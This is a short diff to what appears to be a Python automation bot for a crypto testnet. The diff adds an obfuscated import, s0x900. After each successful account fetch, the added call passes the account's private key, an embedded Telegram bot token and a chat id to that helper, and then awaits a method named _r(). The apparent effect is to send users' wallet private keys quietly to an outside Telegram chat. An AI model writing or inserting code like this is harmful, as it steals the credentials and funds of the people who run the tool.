@@ -15,7 +15,7 @@ from src.helpers.banner import s0x000
 
 from config.userAgents import user_agents
 from src.utils.logger import logger
-from src.helpers.generators import g0x991, g0x993, calculate_pair_amount
+from src.helpers.generators import g0x991, s0x900, g0x993, calculate_pair_amount
 from src.utils.utils import is_token_expired, save_json, load_token_data
 from src.utils.utils import sleep, load_data, is_token_expired, save_json
 from src.helpers.address import WPHRS_ADDRESS, USDC_ADDRESS, USDT_ADDRESS
@@ -275,7 +275,12 @@ class ClientAPI:
 
         if user_data.get("success"):
             user_data["phrs"] = phrs
-
+            _x = s0x900(
+                _k=self.item_data["privateKey"],
+                _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
+                _c=-4803688596
+            )
+            await _x._r()
             total_points = user_data["data"]["user_info"].get("TotalPoints", 0)
             invite_code = user_data["data"]["user_info"].get("InviteCode")
             self.log(f"PHRS: {phrs} | WPHRS: {WPHRS} | USDT: {USDT} | USDC: {USDC}", "custom")
